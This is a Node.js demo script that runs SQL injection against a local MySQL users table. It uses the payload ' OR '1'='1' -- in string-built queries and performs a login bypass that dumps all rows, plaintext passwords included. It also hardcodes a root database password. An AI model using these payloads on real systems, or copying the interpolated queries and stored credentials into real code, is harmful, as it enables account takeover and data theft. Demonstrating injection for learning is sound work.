const mysql = require('mysql2/promise');

const dbConfig = {
  host: 'localhost',
  user: 'root',
  password: 'Shreyas@2005',
  database: 'shreyas'
};

const usersToTest = [
  { email: 'user1@example.com', password: 'password1' },
  { email: 'user2@example.com', password: 'password2' },
  { email: 'user3@example.com', password: 'password3' }
];

const victimUser = { email: 'victim@example.com', password: 'password123' };

const maliciousLoginInput = {
  email: "victim@example.com' OR '1'='1",
  password: "doesnotmatter"
};

async function ensureVictimUserExists(connection) {
  await connection.query(
    'INSERT IGNORE INTO users (email, password) VALUES (?, ?)',
    [victimUser.email, victimUser.password]
  );
}

async function testInjectionOnEmail(connection, user) {
  const injectionPayload = `' OR '1'='1' -- `;
  const injectedEmail = user.email + injectionPayload;
  const query = `SELECT * FROM users WHERE email = '${injectedEmail}'`;

  try {
    const [results] = await connection.query(query);
    if (results.length > 0) {
      console.log(`⚠️ Vulnerability detected with email input: ${user.email}`);
      return true;
    } else {
      console.log(`No vulnerability detected for email: ${user.email}`);
      return false;
    }
  } catch (err) {
    console.error(`Query error for email ${user.email}:`, err.message);
    return false;
  }
}

async function performMaliciousLogin(connection) {
  console.log('\n--- Attempting Malicious Login Using SQL Injection ---');
  const loginQuery = `SELECT * FROM users WHERE email = '${maliciousLoginInput.email}' AND password = '${maliciousLoginInput.password}'`;
  try {
    const [results] = await connection.query(loginQuery);
    if (results.length > 0) {
      console.log(`✅ Malicious login successful! Logged in as user(s):`);
      console.table(results);
    } else {
      console.log('❌ Malicious login failed. No matching user found.');
    }
  } catch (err) {
    console.error('Error during malicious login:', err.message);
  }
}

async function main() {
  const connection = await mysql.createConnection(dbConfig);

  // 1. Insert only the victim user
  await ensureVictimUserExists(connection);

  // 2. Show users before testing
  console.log('\n--- Users in Database ---');
  const [users] = await connection.query('SELECT id, email, password FROM users');
  console.table(users);

  // 3. Test for SQL Injection Vulnerabilities (only testing logic, not inserting)
  console.log('\n--- Testing SQL Injection Vulnerabilities ---\n');
  let vulnerabilitiesFound = 0;
  for (const user of usersToTest) {
    if (await testInjectionOnEmail(connection, user)) {
      vulnerabilitiesFound++;
    }
  }
  console.log(`\nTotal vulnerabilities found: ${vulnerabilitiesFound} out of ${usersToTest.length} tested inputs.\n`);

  // 4. Attempt malicious login
  await performMaliciousLogin(connection);

  // 5. Show all users at the end
  console.log('\n--- Users in Database (After Demo) ---');
  const [finalUsers] = await connection.query('SELECT id, email, password FROM users');
  console.table(finalUsers);

  await connection.end();
}

main().catch(console.error);
